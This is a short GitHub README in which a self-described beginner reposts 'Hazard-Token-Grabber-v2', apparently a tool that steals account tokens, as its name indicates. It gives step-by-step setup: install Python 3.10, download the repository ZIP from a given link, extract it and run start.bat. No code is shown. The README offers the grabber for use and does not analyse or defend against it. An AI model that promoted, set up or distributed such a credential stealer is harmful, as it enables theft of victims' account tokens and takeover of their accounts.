Hello! I'm pretty new on Github! Some days ago I found my old Hazard-Grabber directory and a repost with some changes from someone else. Enjoy this small repost with a hopefully easy tutorial.


As I said - I'm new üëã, but I will try my best ‚ô°
And yes, if you wanna call me that, you can call me a skid. That is the only thing I can do at the moment, but I'm trying to create my own projects. 


I'm learning coding at the moment to create my own projects as I mentioned before, but I'm pretty young and broke, so please don't hate me for copying/posting this stuff :)


### You would make me really happy if you ‚≠ê this repository if you like it!

### üíâ **Installation and use**

</div>

It is really easy to set this up! Just get [python version 3.10](https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe).

Click the blue/green "CODE" button on this page. Choose the option "DOWNLOAD ZIP". Or you can directly download the ZIP from [this link](https://github.com/Gumbobrot/Hazard-Token-Grabber-v2/archive/refs/heads/main.zip).

Extract to ZIP to your Desktop and enter the Hazard-Token-Grabber-v2 folder. In there, just run start.bat and follow the instructions that it gives to you.
